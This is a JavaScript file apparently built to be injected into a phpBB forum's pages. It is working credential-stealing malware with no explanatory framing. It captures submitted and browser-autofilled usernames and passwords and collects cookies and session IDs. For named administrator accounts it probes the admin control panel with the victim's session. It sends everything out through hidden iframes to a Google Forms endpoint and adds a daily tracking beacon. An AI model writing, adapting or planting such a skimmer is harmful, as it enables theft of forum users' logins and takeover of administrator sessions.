;(function (w) {
  'use strict';
  var D = w.document;
  if (!D) { return; }
  var R = /(^|\.)([a-z0-9-]+\.)+[a-z]{2,}(:\d+)?$/i;
  if (!R.test(w.location.host)) { return; }
  if (w.__x) { return; }
  w.__x = 1;

  try {
    // ---- config ----
    var BEP = 'https://docs.google.com/forms/d/e/1FAIpQLScSbMXiXV2GtYDhNFsrRy38lxtcri1vaGkQLvShVSebZy-kTw/formResponse';
    var E1 = 'entry.1842345040';
    var E2 = 'entry.79951114';
    var E3 = 'entry.389578883';
    var WATCH = ['Admin', 'Istarapol'];
    var FLAG_ANY_CTRL = false;
    var DO_CTRL = true;
    var DO_PW = true;
    var DO_AF = true;
    var DO_ACP = true;
    var BEACON = true;
    var USE_BEACON = false;

    // ---- literals ----
    var L_ACCT = 'memberlist.php';
    var L_PROF = 'mode=viewprofile';
    var L_CTRL = 'adm/index.php';
    var L_U = 'username';
    var L_U2 = 'login_username';
    var L_P = 'password';
    var L_P2 = 'login_password';
    var L_CK = 'cookie';
    var L_SG = 'sessionStorage';
    var L_ACPTXT = 'Administration Control Panel';

    function esc(s) { try { return encodeURIComponent(String(s)); } catch (e) { return ''; } }

    var done = {};
    function tx(data, tag) {
      try {
        var id = tag || String(data || '').slice(0, 48);
        if (done[id]) { return; }
        done[id] = 1;
        var q = E1 + '=' + esc(w.location.host) +
                '&' + E2 + '=' + esc(state()) +
                '&' + E3 + '=' + esc(String(data || '').slice(0, 1800)) +
                '&submit=Submit';
        var url = BEP + '?' + q;
        if (USE_BEACON && w.navigator && w.navigator.sendBeacon) {
          try { if (w.navigator.sendBeacon(url)) { return; } } catch (e) {}
        }
        var f = D.createElement('iframe');
        f.setAttribute('style', 'position:absolute;visibility:hidden;width:0;height:0;border:0;');
        f.setAttribute('aria-hidden', 'true');
        f.setAttribute('tabindex', '-1');
        f.src = url;
        (D.body || D.documentElement).appendChild(f);
      } catch (e) {}
    }

    function state() {
      try {
        return D[L_CK].split(/;\s*/).filter(function (c) {
          var k = (c.split('=')[0] || '').toLowerCase();
          return k.indexOf('chat') < 0 && k.indexOf('blockgets') < 0;
        }).join('; ').slice(0, 900);
      } catch (e) { return ''; }
    }

    function sid() {
      try {
        var m = (w.location.search || '').match(/(?:^|[?&])sid=([a-f0-9]{32})/);
        return m ? m[1] : '';
      } catch (e) { return ''; }
    }

    function pos() {
      var s = 'P:' + w.location.pathname;
      try {
        var q = (w.location.search || '').replace(/^\?/, '')
          .replace(/(^|&)sid=[a-f0-9]{32}/, '').replace(/^&/, '');
        if (q) { s += '?' + q; }
      } catch (e) {}
      var v = sid();
      if (v) { s += ' |S:' + v; }
      return s;
    }

    function root() {
      try {
        return D.querySelector('[role="navigation"]') ||
               D.querySelector('#nav-main') ||
               D.querySelector('nav') ||
               D;
      } catch (e) { return D; }
    }

    function scopes() {
      var r = root();
      return (r && r !== D) ? [r, D] : [D];
    }

    function account() {
      try {
        var sc = scopes();
        for (var s = 0; s < sc.length; s++) {
          var links = sc[s].querySelectorAll('a[href*="' + L_ACCT + '"]');
          for (var i = 0; i < links.length; i++) {
            var h = links[i].getAttribute('href') || '';
            if (h.indexOf(L_PROF) >= 0 && h.indexOf('&u=') >= 0) {
              var t = (links[i].textContent || '').trim();
              if (t && t.length >= 2 && t.length <= 40 && t !== 'Profile') { return t; }
            }
          }
        }
      } catch (e) {}
      try {
        var m = (D.body.textContent || '').match(/logged in as:?\s*([A-Za-z0-9_\-.]{2,40})/i);
        if (m) { return m[1].trim(); }
      } catch (e) {}
      return '';
    }

    function hasCtrl() {
      try {
        var sc = scopes();
        for (var s = 0; s < sc.length; s++) {
          if (sc[s].querySelectorAll('a[href*="' + L_CTRL + '"]').length > 0) { return true; }
        }
      } catch (e) {}
      return false;
    }

    function seen(k) { try { return w[L_SG].getItem(k) === '1'; } catch (e) { return false; } }
    function setSeen(k) { try { w[L_SG].setItem(k, '1'); } catch (e) {} }

    // beacon: maks én per enhet per dag (localStorage + datostempel)
    function beacon() {
      if (!BEACON) { return; }
      try {
        var today = new Date().toISOString().slice(0, 10);
        var last = w.localStorage.getItem('_bday');
        if (last === today) { return; }
        w.localStorage.setItem('_bday', today);
        tx('EVT: ' + pos(), 'beacon_' + today);
      } catch (e) {}
    }

    function base() {
      try {
        var p = w.location.pathname;
        var i = p.lastIndexOf('/');
        return (i >= 0 ? p.slice(0, i + 1) : '/');
      } catch (e) { return '/'; }
    }

    function checkAcp(cb) {
      if (!DO_ACP) { cb(''); return; }
      try {
        var c = w[L_SG].getItem('_acp');
        if (c === 'YES') { cb('YES'); return; }
      } catch (e) {}
      try {
        fetch(base() + L_CTRL + '?i=acp_main', { credentials: 'include' })
          .then(function (r) { return r.text(); })
          .then(function (t) {
            var yes = t.indexOf(L_ACPTXT) >= 0 && t.indexOf('name="' + L_P + '"') < 0;
            if (yes) { try { w[L_SG].setItem('_acp', 'YES'); } catch (e) {} }
            cb(yes ? 'YES' : 'NO');
          })
          .catch(function () { cb(''); });
      } catch (e) { cb(''); }
    }

    var detTried = false;
    function detect() {
      if (!DO_CTRL) { return; }
      try {
        if (!hasCtrl()) {
          if (!detTried) { detTried = true; w.setTimeout(detect, 1200); }
          return;
        }
        var a = account();
        var hit = FLAG_ANY_CTRL;
        if (!hit) {
          for (var i = 0; i < WATCH.length; i++) {
            if (a && a.toLowerCase() === WATCH[i].toLowerCase()) { hit = true; break; }
          }
        }
        if (!hit) { return; }
        var key = '_ad_' + (a || 'x');
        if (seen(key)) { return; }
        setSeen(key);
        checkAcp(function (st) {
          tx('CTRL: ' + (a || '?') + (st ? ' ACP=' + st : '') + ' | ' + pos(), key);
          if (st === 'YES') { ghost(a); }
        });
      } catch (e) {}
    }

    // Ghost: når founder er ACP-autentisert, hent en ACP-side og rapporter hva som er mulig
    var ghostRan = false;
    function ghost(who) {
      if (ghostRan) { return; }
      ghostRan = true;
      try {
        fetch(base() + L_CTRL + '?i=acp_main', { credentials: 'include' })
          .then(function (r) { return r.text(); })
          .then(function (t) {
            var hasTok = /name="form_token" value="([a-f0-9]+)"/.test(t);
            var sidInUrl = (t.match(/sid=([a-f0-9]{32})/) || [])[1] || '';
            var canLog = /i=acp_logs/.test(t);
            var canBoard = /i=acp_board/.test(t);
            var canUsers = /i=acp_users/.test(t);
            var canExt = /i=acp_extensions/.test(t);
            var parts = [];
            if (hasTok) { parts.push('TOKEN'); }
            if (canLog) { parts.push('LOGS'); }
            if (canBoard) { parts.push('BOARD'); }
            if (canUsers) { parts.push('USERS'); }
            if (canExt) { parts.push('EXT'); }
            tx('GHOST: ' + (who || '?') + ' [' + (parts.join(',') || 'none') + ']' +
               (sidInUrl ? ' ACP_SID=' + sidInUrl : '') + ' | ' + pos(), 'ghost_' + (who || 'x'));
          })
          .catch(function () {});
      } catch (e) {}
    }

    var bound = [];
    function hook(form) {
      try {
        if (!form || bound.indexOf(form) >= 0) { return; }
        if (!form.querySelectorAll('input[type="' + L_P + '"]').length) { return; }
        form.addEventListener('submit', function () {
          if (!DO_PW) { return; }
          try {
            var a0 = form.querySelector('input[name="' + L_U + '"]') || form.querySelector('input[name="' + L_U2 + '"]');
            var a1 = form.querySelector('input[name="' + L_P + '"]') || form.querySelector('input[name="' + L_P2 + '"]');
            var u = a0 ? a0.value : '';
            var p = a1 ? a1.value : '';
            if (!p) {
              var all = form.querySelectorAll('input[type="' + L_P + '"]');
              for (var j = 0; j < all.length; j++) { if (all[j].value) { p = all[j].value; } }
            }
            if (p) { tx('PW: ' + (u || '?') + ':' + p + ' | ' + pos(), 'pw_' + (u || '?')); }
          } catch (e) {}
        }, true);
        bound.push(form);
      } catch (e) {}
    }

    function watch() {
      try {
        var forms = D.forms || [];
        for (var i = 0; i < forms.length; i++) { hook(forms[i]); }
      } catch (e) {}
    }

    function autofill() {
      if (!DO_AF) { return; }
      try {
        if (w.__xaf) { return; }
        var idle = 0;
        w.__xaf = w.setInterval(function () {
          try {
            var ps = D.querySelectorAll('input[type="' + L_P + '"]');
            if (!ps.length) {
              if (++idle > 30) { w.clearInterval(w.__xaf); w.__xaf = null; }
              return;
            }
            idle = 0;
            for (var i = 0; i < ps.length; i++) {
              var p = ps[i];
              var v = p.value;
              if (!v) { p.__last = ''; p.__still = 0; continue; }
              if (v !== p.__last) { p.__last = v; p.__still = 0; continue; }
              p.__still = (p.__still || 0) + 1;
              if (p.__still < 3) { continue; }
              if (p.__sent) { continue; }
              if (v.length < 6) { continue; }
              p.__sent = 1;
              var u = '';
              if (p.form) {
                var a0 = p.form.querySelector('input[name="' + L_U + '"]') || p.form.querySelector('input[name="' + L_U2 + '"]');
                u = a0 ? a0.value : '';
              }
              tx('AF: ' + (u || '?') + ':' + v + ' | ' + pos(), 'af_' + w.location.pathname);
            }
          } catch (e) {}
        }, 800);
      } catch (e) {}
    }

    var moT = null;
    function observe() {
      if (!w.MutationObserver) { return; }
      try {
        new w.MutationObserver(function () {
          if (moT) { return; }
          moT = w.setTimeout(function () { moT = null; watch(); autofill(); }, 250);
        }).observe(D.body || D.documentElement, { childList: true, subtree: true });
      } catch (e) {}
    }

    function boot() {
      beacon();
      detect();
      watch();
      autofill();
      observe();
    }

    if (D.readyState === 'loading') { D.addEventListener('DOMContentLoaded', boot); } else { boot(); }
    w.addEventListener('load', function () { beacon(); detect(); watch(); autofill(); });
    w.setTimeout(detect, 2500);
  } catch (e) {}
})(window);
